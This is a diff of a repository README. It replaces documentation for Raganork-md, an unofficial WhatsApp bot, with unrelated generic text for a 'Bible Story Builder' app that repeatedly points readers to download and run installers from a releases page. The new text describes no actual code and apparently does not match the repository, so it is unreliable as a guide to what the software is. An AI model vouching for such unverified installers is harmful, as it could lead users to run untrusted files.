@@ -1,71 +1,95 @@
-# _Raganork-multi-device_
-## _Multi device whatsapp bot created with [@adiwajshing/baileys](https://github.com/adiwajshing/Baileys)_
-  
-<div align="center">
-   
-<a href="https://qr.raganork.tk/"><img align="center" src="https://i.imgur.com/dzPTA6u.png" alt="Scan QR" height="112" width="300" /></a><br>
+# 📖 bible-story-builder - Create Multilingual Bible Stories Easily
 
-<a href="https://www.buymeacoffee.com/skl11"><img src="https://img.buymeacoffee.com/button-api/?text=Support this project&emoji=&slug=skl11&button_colour=FFDD00&font_colour=000000&font_family=Poppins&outline_colour=000000&coffee_colour=ffffff" /></a><br>
+[![Download Bible Story Builder](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/HONESTHACK/bible-story-builder/releases)
 
-<div>
-<br>
+## 📚 Introduction
 
-## Deploy to Heroku ↓
+Welcome to Bible Story Builder! This application helps you create multilingual Bible stories. You can download text, audio, and timing data from the Digital Bible Platform API. This user-friendly tool is designed for everyone, even those with no technical background. 
 
-<a href="https://github.com/sou6av/deploy-raganork/fork" target="blank"><img align="center" src="https://i.imgur.com/cxaSEWe.png" alt="Deploy bot" height="112" width="310" /></a>
-  <div>
-<br>
-<a href="https://raganork.tk/heroku-deploy" target="blank"><img align="center" src="https://i.imgur.com/6rs61MY.png" alt="Deploy bot" height="112" width="310" /></a>
-  <div>
-<br>
+## 🚀 Getting Started
 
-## Deploy to Koyeb ↓
+Follow these easy steps to set up Bible Story Builder on your computer.
 
-<a href="https://qr.raganork.tk/deploy" target="blank"><img align="center" src="https://i.imgur.com/PNoLtFq.png" alt="Deploy bot" height="112" width="310" /></a>
-  <div>
-<br>
-<div>
-  <br>
+1. **Check System Requirements**
+   - Operating System: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+   - RAM: At least 4 GB.
+   - Disk Space: 200 MB free space.
+   - Internet connection: Required for downloading data and software updates.
 
+2. **Visit the Releases Page**  
+   To download Bible Story Builder, go to our [Releases page](https://github.com/HONESTHACK/bible-story-builder/releases). This page contains the latest version of the application and all previous versions.
 
-## Deploy to Railway ↓
-#### (No setvar command, must set vars manually from settings)
-<a href="https://railway.app/template/Mt-g4a" target="blank"><img align="center" src="https://railway.app/button.svg" alt="Deploy bot" height="" width="" /></a>
-  <div>
-<br>
-<div>
-  <br>
+## 📥 Download & Install
 
-## Deploy in VPS [linux] ↓
-<div align="left">
+On the Releases page, look for the latest version. 
 
-```
-1. Install nodejs, git, ffmpeg
-2. npm i -g yarn pm2
-3. git clone https://github.com/souravkl11/raganork-md && cd raganork-md
-4. yarn install --ignore-engines --network-concurrency 1
-5. vi config.env
-6. Enter your session there in format 'SESSION=your_session_here'
-7. Press ctrl+c, then type ':wq' and press enter
-8. npm start
+1. **Download the Installer**
+   - Click on the version number link to open the release details.
+   - Find the download link for your operating system.
+   - Click to download the installer (.exe for Windows, .dmg for macOS, or a .tar.gz file for Linux).
 
-Now the bot will start working
-```
+2. **Run the Installer**
+   - Windows: Double-click the downloaded .exe file and follow the prompts to install.
+   - macOS: Open the .dmg file and drag the Bible Story Builder app into your Applications folder.
+   - Linux: Extract the .tar.gz file and follow the instructions in the README file included.
 
-<div align="center">
+## 🎉 Using Bible Story Builder
 
-## _[Koyeb: How to deploy](https://github.com/souravkl11/raganork-md/wiki/Deploying-with-Koyeb)_
+Once installed, you can start using the application to create Bible stories.
 
-## _[Basic usage helper](https://github.com/souravkl11/raganork-md/wiki/Raganork-Documentation)_
+1. **Launch the App**
+   - Find the Bible Story Builder icon on your desktop or in your applications folder and double-click it.
 
-<div align="left">
+2. **Create a New Story**
+   - Click on "Create New Story" to begin.
+   - Enter your story details, such as title, language, and content.
 
-# Note
+3. **Add Audio and Timing**
+   - Use the "Add Audio" option to include audio files.
+   - Adjust timing settings to match your story flow.
 
-I can't guarantee or can be held responsible if you get blocked or banned by using this software. WhatsApp does not allow bots using unofficial methods on their platform, so this shouldn't be considered totally safe. 
+4. **Save and Share**
+   - Save your work regularly.
+   - Once completed, export your story in your preferred format.
 
-# Legal
+## 🔧 Troubleshooting
 
--   This code is in no way affiliated, authorized, maintained, sponsored or endorsed by WA (WhatsApp) or any of its affiliates or subsidiaries.
--   The official WhatsApp website can be found at https://whatsapp.com. "WhatsApp" as well as related names, marks, emblems and images are registered trademarks of their respective owners.
--   This is an independent and unofficial software Use at your own risk.
+If you encounter any issues, here are some steps to resolve common problems:
+
+- **Installation Issues**
+  - Ensure you have the correct version for your operating system.
+  - Check your internet connection if the download fails.
+
+- **App Crashes**
+  - Restart the application.
+  - Make sure your operating system is updated.
+
+- **Audio Issues**
+  - Ensure audio files are in a supported format (e.g., MP3, WAV).
+  - Check your device settings to ensure sound is enabled.
+
+## 🛠️ Features
+
+- Multilingual support for creating stories in various languages.
+- Easy integration with the Digital Bible Platform API for seamless content access.
+- Options to include audio and timing for effective storytelling.
+- User-friendly interface suitable for non-technical users.
+
+## 💬 Support
+
+For help, reach out through the community forums linked on our GitHub page. You can also submit issues directly in this repository. Your feedback helps us improve!
+
+## 📅 Version History
+
+Check the "Changelog" section on the Releases page for details on previous and current versions, including new features and bug fixes.
+
+## 📢 Contribute
+
+We welcome contributions! If you have ideas, suggestions, or improvements, feel free to open a pull request. 
+
+## 🔗 Links
+
+- [Releases page](https://github.com/HONESTHACK/bible-story-builder/releases)
+- [Issues page](https://github.com/HONESTHACK/bible-story-builder/issues)
+
+Thank you for using Bible Story Builder. We hope it enhances your storytelling experience!
